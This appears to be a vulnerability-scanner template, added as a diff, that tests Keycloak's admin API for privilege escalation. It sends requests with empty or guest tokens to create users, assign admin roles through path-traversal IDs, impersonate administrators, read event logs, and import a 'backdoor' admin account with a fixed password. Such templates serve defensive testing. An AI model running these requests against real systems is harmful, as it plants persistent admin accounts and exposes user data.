@@ -1,0 +1,273 @@
+# Keycloak Privilege Escalation
+# Tests for privilege escalation vulnerabilities
+
+id: keycloak-privilege-escalation
+
+info:
+  name: Keycloak Privilege Escalation
+  author: H1/rfs85
+  severity: high
+  description: Tests for privilege escalation vulnerabilities in Keycloak
+  reference:
+    - https://www.keycloak.org/docs/latest/server_admin/index.html#_per_realm_admin_permissions
+  tags: keycloak,privilege-escalation,rbac,authorization
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/admin/realms/{{realm}}/users"
+      - "{{BaseURL}}/admin/realms/{{realm}}/users"
+
+    headers:
+      Content-Type: "application/json"
+      Authorization: "Bearer {{token}}"
+
+    body: |
+      {
+        "username": "testuser",
+        "email": "test@example.com",
+        "enabled": true,
+        "credentials": [{"type": "password", "value": "password123", "temporary": false}]
+      }
+
+    payloads:
+      realm:
+        - "master"
+        - "admin"
+      token:
+        - ""
+        - "null"
+        - "invalid"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "201 Created"
+          - "id"
+          - "username"
+        condition: or
+
+      - type: status
+        status:
+          - 201
+          - 409
+
+    extractors:
+      - type: json
+        name: user_id
+        part: body
+        json:
+          - ".id"
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/auth/admin/realms/{{realm}}/users/{{user_id}}/role-mappings/realm"
+      - "{{BaseURL}}/admin/realms/{{realm}}/users/{{user_id}}/role-mappings/realm"
+
+    headers:
+      Content-Type: "application/json"
+      Authorization: "Bearer {{token}}"
+
+    body: |
+      [{"id": "{{role_id}}", "name": "admin", "composite": false}]
+
+    payloads:
+      realm:
+        - "master"
+        - "admin"
+      user_id:
+        - "test-user-id"
+        - "../admin"
+        - "../../admin"
+      role_id:
+        - "admin-role-id"
+        - "realm-admin"
+      token:
+        - ""
+        - "bearer null"
+
+    attack: pitchfork
+
+    matchers:
+      - type: status
+        status:
+          - 204
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/auth/admin/realms/{{realm}}/roles"
+      - "{{BaseURL}}/admin/realms/{{realm}}/roles"
+      - "{{BaseURL}}/auth/admin/realms/{{realm}}/clients/{{client_id}}/roles"
+      - "{{BaseURL}}/admin/realms/{{realm}}/clients/{{client_id}}/roles"
+
+    headers:
+      Authorization: "Bearer {{token}}"
+
+    payloads:
+      realm:
+        - "master"
+        - "admin"
+      client_id:
+        - "realm-management"
+        - "security-admin-console"
+        - "admin-cli"
+      token:
+        - ""
+        - "null"
+        - "guest"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "realm-admin"
+          - "manage-users"
+          - "manage-clients"
+          - "view-realm"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        name: roles
+        part: body
+        json:
+          - ".[].name"
+          - ".[].id"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/admin/realms/{{realm}}/users/{{user_id}}/impersonation"
+      - "{{BaseURL}}/admin/realms/{{realm}}/users/{{user_id}}/impersonation"
+
+    headers:
+      Authorization: "Bearer {{token}}"
+
+    payloads:
+      realm:
+        - "master"
+        - "admin"
+      user_id:
+        - "admin"
+        - "administrator"
+        - "service-account"
+      token:
+        - ""
+        - "guest"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "redirect"
+          - "impersonate"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/auth/admin/realms/{{realm}}/attack-detection/brute-force/users"
+      - "{{BaseURL}}/admin/realms/{{realm}}/attack-detection/brute-force/users"
+      - "{{BaseURL}}/auth/admin/realms/{{realm}}/events"
+      - "{{BaseURL}}/admin/realms/{{realm}}/events"
+
+    headers:
+      Authorization: "Bearer {{token}}"
+
+    payloads:
+      realm:
+        - "master"
+        - "admin"
+      token:
+        - ""
+        - "null"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "events"
+          - "userId"
+          - "ipAddress"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        name: events
+        part: body
+        json:
+          - ".[].userId"
+          - ".[].ipAddress"
+          - ".[].type"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/admin/realms/{{realm}}/partialImport"
+      - "{{BaseURL}}/admin/realms/{{realm}}/partialImport"
+
+    headers:
+      Content-Type: "application/json"
+      Authorization: "Bearer {{token}}"
+
+    body: |
+      {
+        "ifResourceExists": "OVERWRITE",
+        "users": [{
+          "username": "backdoor",
+          "enabled": true,
+          "credentials": [{"type": "password", "value": "backdoor123"}],
+          "realmRoles": ["admin"]
+        }]
+      }
+
+    payloads:
+      realm:
+        - "master"
+        - "admin"
+      token:
+        - ""
+        - "guest"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "added"
+          - "overwritten"
+          - "results"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: json
+        name: import_results
+        part: body
+        json:
+          - ".results.added"
+          - ".results.overwritten"
